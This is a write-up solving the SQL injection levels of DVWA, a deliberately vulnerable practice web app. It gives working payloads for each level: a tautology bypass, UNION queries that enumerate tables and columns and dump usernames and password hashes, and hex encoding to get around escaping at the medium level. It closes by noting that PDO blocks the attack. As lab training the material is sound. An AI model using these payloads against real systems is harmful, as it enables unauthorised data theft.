# DVWA - SQL Injection Solution


## Low level
> In this level we can see the web doesn't filter any character.
> 
> ![](https://i.imgur.com/RA0RxD7.png)
> 
> So, we can use `' or '1' = '1` to bypass and get the all data inb SQL. 
> 
> ![](https://i.imgur.com/F5Wyop9.png)
> 
> We also can use `1' or 1=1 order by 1 #` or `1' union select 1,2 #` to guess how many column there have in the SQL. 
> Use `1' union select 1,database() #` to know what database we are. 
> 
> ![](https://i.imgur.com/AObQp2l.png)
> 
> Use `1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #` to get the table.
> 
> ![](https://i.imgur.com/x5QwtGW.png)
> 
> Use `1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #` to get the text of the table.
> 
> ![](https://i.imgur.com/vzKXgPJ.png)
> 
> Use the `1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #` to download all of data in the table.
> 
> ![](https://i.imgur.com/IZdCYXR.png)
> 

## Medium level
> In this level we can see, it use the scroll bar to select. And it use `mysql_real_escape_string` to transfer some character. So, we can use the brup suite to edit the package.
> 
> ![](https://i.imgur.com/CYYdgfT.png)
> 
> Edit the ir to `1 or 1=1` .
> 
> ![](https://i.imgur.com/08LQWu6.png)
> 
> And we can get the all of the data in SQL.
> 
> ![](https://i.imgur.com/CI1BexM.png)
> We can use the same like the low level to get the information in SQL. 
> Notice if we need to use `1 union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #` the `'` is transfered to `/'`. Therefore we can transfer the `user` to hex like `1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 #`

## High level
> We can see in high level it use `LIMIT 1` to limit the output, but we can use `#` to skip the text after `#`.
> Then we can use the way like Low level to bypass.
> 
> ![](https://i.imgur.com/kyM4OFF.png)
> 

## Impossible level
> In this level it use the PDO and add the Anti-CSRF token to avoid the SQL injection and CSRF attack. So, we don't have any way to use the SQL injection to attack.











